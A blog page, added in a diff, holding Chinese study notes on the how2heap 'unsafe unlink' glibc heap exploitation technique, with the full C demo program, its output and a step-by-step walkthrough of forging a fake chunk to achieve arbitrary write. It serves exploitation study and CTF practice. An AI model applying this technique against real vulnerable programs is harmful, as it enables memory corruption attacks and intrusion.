@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>how2heap-04 unsafe unlink实践笔记</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>how2heap-04 unsafe unlink实践笔记</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-09">2017-08-09</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#tutorials" title="tutorials">tutorials</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#heap" title="heap">heap</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<blockquote>
+  <p>本文是对shellphish的<a href="https://github.com/shellphish/how2heap">how2heap</a>系列堆漏洞课程的实践笔记</p>
+</blockquote>
+
+<h2 id="示例代码">示例代码</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+</span>
+
+<span class="kt">uint64_t</span> <span class="o">*</span><span class="n">chunk0_ptr</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Welcome to unsafe unlink 2.0!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Tested in Ubuntu 14.04/16.04 64bit.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+	<span class="kt">int</span> <span class="n">malloc_size</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span> <span class="c1">//we want to be big enough not to use fastbins
+</span>	<span class="kt">int</span> <span class="n">header_size</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+	<span class="cm">/* [1] */</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+	<span class="n">chunk0_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="n">malloc_size</span><span class="p">);</span> <span class="c1">//chunk0
+</span>	<span class="kt">uint64_t</span> <span class="o">*</span><span class="n">chunk1_ptr</span>  <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="n">malloc_size</span><span class="p">);</span> <span class="c1">//chunk1
+</span>	<span class="n">printf</span><span class="p">(</span><span class="s">"The global chunk0_ptr is at %p, pointing to %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">chunk0_ptr</span><span class="p">,</span> <span class="n">chunk0_ptr</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"The victim chunk we are going to corrupt is at %p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">chunk1_ptr</span><span class="p">);</span>
+	<span class="cm">/* [2] */</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"We create a fake chunk inside chunk0.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">chunk0_ptr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">chunk0_ptr</span><span class="o">-</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">chunk0_ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">chunk0_ptr</span><span class="o">-</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Fake chunk fd: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="n">chunk0_ptr</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Fake chunk bk: %p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="n">chunk0_ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
+	<span class="cm">/* [3] */</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (fd-&gt;prev_size)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">chunk0_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">chunk0_ptr</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x%08lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">chunk0_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="cm">/* [4] */</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="kt">uint64_t</span> <span class="o">*</span><span class="n">chunk1_hdr</span> <span class="o">=</span> <span class="n">chunk1_ptr</span> <span class="o">-</span> <span class="n">header_size</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">chunk1_hdr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc_size</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">chunk1_hdr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">chunk1_hdr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="mi">1</span><span class="p">;</span>
+	<span class="cm">/* [5] */</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">free</span><span class="p">(</span><span class="n">chunk1_ptr</span><span class="p">);</span>
+	<span class="cm">/* [6] */</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="kt">char</span> <span class="n">victim_string</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+	<span class="n">strcpy</span><span class="p">(</span><span class="n">victim_string</span><span class="p">,</span><span class="s">"Hello!~"</span><span class="p">);</span>
+	<span class="n">chunk0_ptr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">victim_string</span><span class="p">;</span>
+	<span class="cm">/* [7] */</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Original value: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">victim_string</span><span class="p">);</span>
+	<span class="n">chunk0_ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4141414142424242LL</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"New Value: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">victim_string</span><span class="p">);</span>
+	<span class="cm">/* [8] */</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="样例输出">样例输出</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to unsafe unlink 2.0!
+Tested in Ubuntu 14.04/16.04 64bit.
+This technique can be used when you have a pointer at a known location to a region you can call unlink on.
+The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
+The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.
+
+The global chunk0_ptr is at 0x602068, pointing to 0x603010
+The victim chunk we are going to corrupt is at 0x6030a0
+
+We create a fake chunk inside chunk0.
+We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.
+We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.
+With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False
+Fake chunk fd: 0x602050
+Fake chunk bk: 0x602058
+
+We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (fd-&gt;prev_size)
+With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False
+Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x00000000
+You can find the commitdiff of this check athttps://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
+
+We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
+We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
+It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
+If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
+We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.
+
+Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
+You can find the source of the unlink macro at[](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344)
+
+At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
+chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
+Original value: Hello!~
+New Value: BBBBAAAA
+</code></pre></div></div>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>这节我们学习<code class="highlighter-rouge">unsafe unlink</code>，即不安全的unlink解链操作。当我们得到了一个可以进行unlink操作的地址指针的话，就可以使用这项技术。最常见的利用情景就是我们有一个可以溢出的漏洞函数同时拥有一个全局指针时。</p>
+
+<p>而本次示例的重点在于如何使用<code class="highlighter-rouge">free()</code>破坏全局指针来实现任意地址读写</p>
+
+<h2 id="1-定义malloc_size和header_size">[1] 定义malloc_size和header_size</h2>
+
+<p>程序定义了malloc_size为0x80，尽量地大以避免使用<code class="highlighter-rouge">fastbins</code>，而后定义了header_size为2</p>
+
+<h2 id="2-malloc申请两块空间">[2] malloc申请两块空间</h2>
+
+<p>malloc申请了两块空间，分别为<code class="highlighter-rouge">chunk0</code>和<code class="highlighter-rouge">chunk1</code>并用<code class="highlighter-rouge">chunk0_ptr</code>和<code class="highlighter-rouge">chunk1_ptr</code>指向其，我们可以看到，<code class="highlighter-rouge">chunk0_ptr</code>这个指针所在的地址(全局指针变量存储在bss段上)为<code class="highlighter-rouge">0x602068</code>，指向<code class="highlighter-rouge">0x603010</code>(指向分配的堆地址)，而<code class="highlighter-rouge">chunk1_ptr</code>指向<code class="highlighter-rouge">0x6030a0</code>(堆地址)，两个chunk之间的距离是<code class="highlighter-rouge">0x90 = 0x80 + 0x10</code>，这多出的<code class="highlighter-rouge">0x10</code>是chunk的头信息，对于<code class="highlighter-rouge">Allocated chunk</code>，头信息只有<code class="highlighter-rouge">prev_size</code>和<code class="highlighter-rouge">size</code>两项。</p>
+
+<p>这里我们可以这样认为，<code class="highlighter-rouge">*chunk_ptr</code>为变量<code class="highlighter-rouge">chunk_ptr</code>所指向的堆地址的值，而<code class="highlighter-rouge">chunk_ptr</code>则代表该指针指向的堆地址，而<code class="highlighter-rouge">&amp;chunk_ptr</code>为指针<code class="highlighter-rouge">chunk_ptr</code>存储在栈上(或bss段上，取决于指针是否为全局指针变量)的地址。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">The</span> <span class="n">global</span> <span class="n">chunk0_ptr</span> <span class="n">is</span> <span class="n">at</span> <span class="mh">0x602068</span><span class="p">,</span> <span class="n">pointing</span> <span class="n">to</span> <span class="mh">0x603010</span>
+<span class="n">The</span> <span class="n">victim</span> <span class="n">chunk</span> <span class="n">we</span> <span class="n">are</span> <span class="n">going</span> <span class="n">to</span> <span class="n">corrupt</span> <span class="n">is</span> <span class="n">at</span> <span class="mh">0x6030a0</span>
+</code></pre></div></div>
+
+<h2 id="3-构造fake-chunk">[3] 构造fake chunk</h2>
+
+<p>如果明白了<code class="highlighter-rouge">*chunk0_ptr</code>，<code class="highlighter-rouge">chunk0_ptr</code>和<code class="highlighter-rouge">&amp;chunk0_ptr</code>之间的关系的话，这里我们也可以很清楚的看明白是个什么操作</p>
+
+<p>[3]主要是在堆块<code class="highlighter-rouge">chunk0</code>的<code class="highlighter-rouge">data</code>区构造一个<code class="highlighter-rouge">fake chunk</code>，暂且称为<code class="highlighter-rouge">P</code>吧，并且将这个<code class="highlighter-rouge">fake chunk</code>的<code class="highlighter-rouge">fake fd</code>和<code class="highlighter-rouge">fake bk</code>指向指针<code class="highlighter-rouge">chunk0_ptr</code>附近，意思就是<code class="highlighter-rouge">P-&gt;fd-&gt;bk = P</code>以及<code class="highlighter-rouge">P-&gt;bk-&gt;fd = P</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//The global chunk0_ptr is at 0x602068
+</span><span class="n">Fake</span> <span class="n">chunk</span> <span class="n">fd</span><span class="o">:</span> <span class="mh">0x602050</span>
+<span class="n">Fake</span> <span class="n">chunk</span> <span class="n">bk</span><span class="o">:</span> <span class="mh">0x602058</span>
+</code></pre></div></div>
+
+<p>这样我们就通过了检查<code class="highlighter-rouge">(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n")</code></p>
+
+<h2 id="4-构造fake-chunk的size与next-chunk的prev_size相等">[4] 构造fake chunk的size与next chunk的prev_size相等</h2>
+
+<p>为了通过检查<code class="highlighter-rouge">(chunksize(P) != prev_size (next_chunk(P)) == False</code>，我们需要将我们伪造的chunk <code class="highlighter-rouge">P</code>的下一个chunk的<code class="highlighter-rouge">prev_size</code>位设置为<code class="highlighter-rouge">chunk P</code>的<code class="highlighter-rouge">size</code>，这样就能通过检查</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">chunk0_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">chunk0_ptr</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">];</span>
+<span class="n">Therefore</span><span class="p">,</span> <span class="n">we</span> <span class="n">set</span> <span class="n">the</span> <span class="err">'</span><span class="n">size</span><span class="err">'</span> <span class="n">of</span> <span class="n">our</span> <span class="n">fake</span> <span class="n">chunk</span> <span class="n">to</span> <span class="n">the</span> <span class="n">value</span> <span class="n">of</span> <span class="n">chunk0_ptr</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">:</span> <span class="mh">0x00000000</span>
+</code></pre></div></div>
+
+<p>这样我们<code class="highlighter-rouge">fake chunk</code>的<code class="highlighter-rouge">size</code>就等于<code class="highlighter-rouge">next chunk</code>的<code class="highlighter-rouge">prev_size</code>，虽然是<code class="highlighter-rouge">0x00000000</code>，但是没关系，我们只需要满足两者相等就可以了。</p>
+
+<h2 id="5-修改next-chunk的prev_size和p位">[5] 修改next chunk的prev_size和P位</h2>
+
+<p>这里的<code class="highlighter-rouge">chunk1_hdr</code>位于<code class="highlighter-rouge">chunk1_ptr</code>所指向的堆地址，再上去<code class="highlighter-rouge">2</code>个长度，也就是<code class="highlighter-rouge">chunk1_ptr</code>指向<code class="highlighter-rouge">chunk1</code>的数据区，而<code class="highlighter-rouge">chunk1_hdr</code>指向<code class="highlighter-rouge">chunk1</code>的<code class="highlighter-rouge">metadata</code>起始处，也就是中间是<code class="highlighter-rouge">prev_size</code>和<code class="highlighter-rouge">size</code>，也就是<code class="highlighter-rouge">header_size=2</code></p>
+
+<p>我们这里因为在<code class="highlighter-rouge">chunk0</code>的数据区构造了一个<code class="highlighter-rouge">fake chunk</code>，而我们需要误导glibc,让它以为<code class="highlighter-rouge">chunk1</code>的上一个<code class="highlighter-rouge">chunk</code>是<code class="highlighter-rouge">fake chunk</code>，那么我们就需要改变<code class="highlighter-rouge">prev_size</code>，让他变小，比如原先是<code class="highlighter-rouge">0x90 + chunk1_address = chunk0_address</code>，那么我们现在<code class="highlighter-rouge">0x80 + chunk1_address = fake_chunk_address</code>。同时我们需要将<code class="highlighter-rouge">chunk1</code>的<code class="highlighter-rouge">P</code>(prev_inuse)为设置为0，也就是设定<code class="highlighter-rouge">fake chunk</code>是处于<code class="highlighter-rouge">freed</code>的状态。因为只有被释放的<code class="highlighter-rouge">chunk</code>，它的<code class="highlighter-rouge">metadata</code>才有<code class="highlighter-rouge">fd</code>和<code class="highlighter-rouge">bk</code>。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">chunk1_hdr</span> <span class="o">=</span> <span class="n">chunk1_ptr</span> <span class="o">-</span> <span class="n">header_size</span><span class="p">;</span>
+<span class="n">chunk1_hdr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc_size</span><span class="p">;</span>
+<span class="n">chunk1_hdr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="mi">1</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="6-unsafe-unlink">[6] unsafe unlink</h2>
+
+<p>在free掉chunk1后，触发unsafe unlink，这时chunk0_ptr[0]和chunk0_ptr[3]实际上指向同一个地址，因此当修改chunk0_ptr[3]时实际上也是修改chunk0_ptr[0].</p>
+
+<p>这里我们需要注意，free后进行的unlink操作是如何的，首先unlink操作如下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span>
+<span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span>
+</code></pre></div></div>
+
+<p>因此，我们来理一下大概的堆块结构，因为<code class="highlighter-rouge">fd</code>和<code class="highlighter-rouge">bk</code>都指向堆块头，因此，当<code class="highlighter-rouge">P-&gt;fd</code>为<code class="highlighter-rouge">0x602050</code>时再计算<code class="highlighter-rouge">bk</code>时，会从<code class="highlighter-rouge">0x602050</code>处加上偏移<code class="highlighter-rouge">sizeof(uint64_t)*3</code>，也就是<code class="highlighter-rouge">0x602068</code>处，即我们原来的<code class="highlighter-rouge">chunk0_ptr</code>位置</p>
+
+<p>也就是说，此时在<code class="highlighter-rouge">0x602068</code>位置存储着地址<code class="highlighter-rouge">0x602058</code>
+| address  | pointer	 |
+|———-|———–|
+| 0x602050 |P-&gt;fd			 |
+| 0x602058 |P-&gt;bk 		 |
+| 0x602060 |					 |
+| 0x602068 |Ｐ-&gt;fd-&gt;bk(chunk0_ptr)|</p>
+
+<p>那么同理以<code class="highlighter-rouge">P-&gt;bk</code>作为堆块头的话，</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>address</th>
+      <th>pointer</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0x602050</td>
+      <td>P-&gt;fd</td>
+    </tr>
+    <tr>
+      <td>0x602058</td>
+      <td>P-&gt;bk</td>
+    </tr>
+    <tr>
+      <td>0x602060</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>0x602068</td>
+      <td>Ｐ-&gt;bk-&gt;fd(chunk0_ptr)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><code class="highlighter-rouge">0x602068</code>相对<code class="highlighter-rouge">0x602058</code>是<code class="highlighter-rouge">fd</code>的位置，因此，此时在<code class="highlighter-rouge">0x602068</code>位置存储着地址<code class="highlighter-rouge">0x602050</code></p>
+
+<p>以上就是整个free操作时进行的<code class="highlighter-rouge">unlink</code>操作</p>
+
+<h2 id="7-获取数组地址">[7] 获取数组地址</h2>
+
+<p>此刻<code class="highlighter-rouge">0x602068</code>位置存储着的是<code class="highlighter-rouge">0x602050</code>，因此<code class="highlighter-rouge">chunk0_ptr</code>指向<code class="highlighter-rouge">0x602050</code>，<code class="highlighter-rouge">chunk0_ptr[3]</code>指向<code class="highlighter-rouge">0x602068</code>，这时<code class="highlighter-rouge">chunk0_ptr[3] = (uint64_t) victim_string</code>实际上是将<code class="highlighter-rouge">victim_string</code>的数组首地址存入<code class="highlighter-rouge">0x602068</code>中</p>
+
+<h2 id="8-向数组地址写入数据">[8] 向数组地址写入数据</h2>
+
+<p>此时，<code class="highlighter-rouge">0x602068</code>位置存储的是<code class="highlighter-rouge">victim_string</code>的地址，因此<code class="highlighter-rouge">chunk0_ptr</code>指向数组地址，<code class="highlighter-rouge">chunk0_ptr[0]</code>即为数组首地址(<code class="highlighter-rouge">0x7fffffffdbc0</code>)</p>
+
+<p>修改<code class="highlighter-rouge">chunk0_ptr</code>处的数据就是修改<code class="highlighter-rouge">victim_string</code>的数据</p>
+
+<p><img src="http://od7mpc53s.bkt.clouddn.com/how2heap-unsafe_unlink.jpg" alt="unsafe_unlink" /></p>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/09/Heap-memory/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/09/malloc-chunk/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/09/Heap-memory/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/09/malloc-chunk/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
